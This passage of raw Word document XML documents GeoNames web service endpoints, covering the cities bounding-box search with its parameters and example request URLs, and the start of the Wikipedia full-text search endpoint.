          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> : api.geonames.org/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>citiesJSON</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Parameters :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>north,south,east,west</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> : coordinates of bounding box</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">callback : name of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> function (optional parameter)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> : language of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>placenames</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wikipedia</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>urls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (default = en)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>maxRows</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> : maximal number of rows returned (default = 10)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Result : returns a list of cities and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>placenames</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the bounding box, ordered by relevancy (capital/population). </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Placenames</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> close together are </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>filterered</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> out and only the larger name is included in the resulting list.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Example :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId196" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>http://api.geonames.org/citiesJSON?north=44.1&amp;south=-9.9&amp;east=-22.4&amp;west=55.2&amp;lang=de&amp;username=demo</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>This service is also available in XML output :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Example :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId197" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>http://api.geonames.org/cities?north=44.1&amp;south=-9.9&amp;east=-22.4&amp;west=55.2&amp;username=demo</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3E5E7A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3E5E7A"/>
        </w:rPr>
        <w:t xml:space="preserve">Wikipedia </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3E5E7A"/>
        </w:rPr>
        <w:t>Fulltext</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3E5E7A"/>
        </w:rPr>
        <w:t xml:space="preserve"> Search</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Webservice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Type :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> XML or JSON</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> : api.geonames.org/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wikipediaSearch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>api.geonames.org/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wikipediaSearchJSON</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Parameters : q : place name (</w:t>
      </w:r>
      <w:hyperlink r:id="rId198" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>urlencoded utf8</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">title : search in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wikipedia</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> title (optional)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> : language code, supported languages are </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>de,en,es,fr,it,nl,pl,pt,ru,zh</w:t>
